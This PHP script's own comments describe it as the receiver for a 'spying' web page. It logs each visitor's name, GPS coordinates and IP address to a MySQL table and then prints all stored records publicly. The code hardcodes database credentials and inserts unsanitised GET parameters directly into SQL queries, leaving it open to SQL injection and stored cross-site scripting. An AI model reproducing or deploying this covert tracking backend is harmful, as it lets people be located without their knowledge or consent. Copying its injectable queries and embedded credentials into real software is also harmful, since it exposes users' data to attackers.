<?php
//  This file receives the data from the spying .html document written in javascript, including the GPS provided by its GoogleMaps api and storest the infromation to the database. In this verison its with mysqli/


function connectToDatabase()	{
	/// Connecting to the database
	global $conMySQL;
	$conMySQL=mysqli_connect("133.242.137.52","florjan","dbpass456","test");
	
	// Check connection
	if (mysqli_connect_errno())
 	 {
  	echo "Failed to connect to MySQL: " . mysqli_connect_error();
 	 }
}


function connectToDatabaseWithPDO()	{
	global $dbDAO;
	$dbDAO = new PDO('mysql:host=133.242.137.52;dbname=test;charset=utf8', '', '');
	$dbDAO->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	$dbDAO->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
}


//Sets local time...because otherwise it shows UTC0
date_default_timezone_set('Asia/Tokyo'); 

//Defining Variables
$mysqldate = date('Y-m-d H:i:s');  // Puts date in a variable ina form suitable for mysql database
$name = $_GET['name'];
$longitude =$_GET['longitude_spijun'];
$latitude = $_GET['latitude_spijun'];
$IPclient = $_SERVER['REMOTE_ADDR'];

//VERY IMPORTANT VERY IMPORTANT
// Connects to the Database with Mysqli or DAO. Comment out the $iAmUsingMysqli if you are using PDO.
//$iAmUsingMysqli = "it doesnt really matter whats here. If I am set I will be mysqli";


// Choose if connect with PDO or Mysqli
if (isset($iAmUsingMysqli))	connectToDatabase();
else if (!isset($iAmUsingMysqli))	connectToDatabaseWithPDO();


//Inserting data
//Only excetutes if it acually managed to get the coordinates. Becuse if it didnt, whats the point of messing with the database?
if (isset($_GET['longitude_spijun'])) {

//Want to use the Mysqli to manage the database?
	if (isset($iAmUsingMysqli))
	{
	//connects to database with mysqli

	//Inserts data with mysqli
	mysqli_query($conMySQL,"INSERT INTO `test`.`Spijun` (
		`ID_spijun`, 
		`name_spijun`, 
		`date_spijun`, 
		`longitude_spijun`,
		`latitude_spijun`,
		`IP`
		) VALUES (NULL, 
		'$name', 
		'$mysqldate', 
		'$longitude',
		'$latitude',
		'$IPclient'
		);");
	}
	
	//Or do you prefer to use PDO?
	else if (!isset($iAmUsingMysqli))
	{
	$dbDAO->query("INSERT INTO `test`.`Spijun` (
		`ID_spijun`, 
		`name_spijun`, 
		`date_spijun`, 
		`longitude_spijun`,
		`latitude_spijun`,
		`IP`
		) VALUES (NULL, 
		'$name', 
		'$mysqldate', 
		'$longitude',
		'$latitude',
		'$IPclient'
		);");
	}
	
}


//Prints the database with mysqli...or in the "else if" with PDO
if (isset($iAmUsingMysqli))
{
	//Reads the table Spijun and stores the data in to a variable
	$result = mysqli_query($conMySQL,"SELECT * FROM Spijun");

	//Prints the table in HTML form
	while($row = mysqli_fetch_array($result))
  	{
  	echo $row['name_spijun'] . " " . $row['date_spijun'] . " " . $row['longitude_spijun']. " " . $row['latitude_spijun'];
  	echo "<br>";
 	 }
 	//Closes the mysql connection
 	mysqli_close($conMySQL);
} 

else if (!isset($iAmUsingMysqli))
{
	//Creates a table:
	echo "<table><tr><th>Time</th><th>Name</th><th>Longitude</th><th>Latitude</th><th>IP</th></tr>";

	//try is here for some debugging purposes. This reads all the table contents and echoes them in a table.
	try {
	    foreach($dbDAO->query('SELECT * FROM Spijun') as $row) 
	    	{
    		echo 
    		"<tr><td>" . 
    		$row['date_spijun'].'</td><td>'.
    		$row['name_spijun'].'</td><td>'.
    		$row['longitude_spijun'].'</td><td>'.
    		$row['latitude_spijun'].'</td><td>'.
    		$row['IP'].'</td></tr>';
			}
		} 
	
	catch(PDOException $ex) 
	{
    	echo "Oh noes. You did someting wong"; //user friendly message
	}
	echo "</table>";
}



?>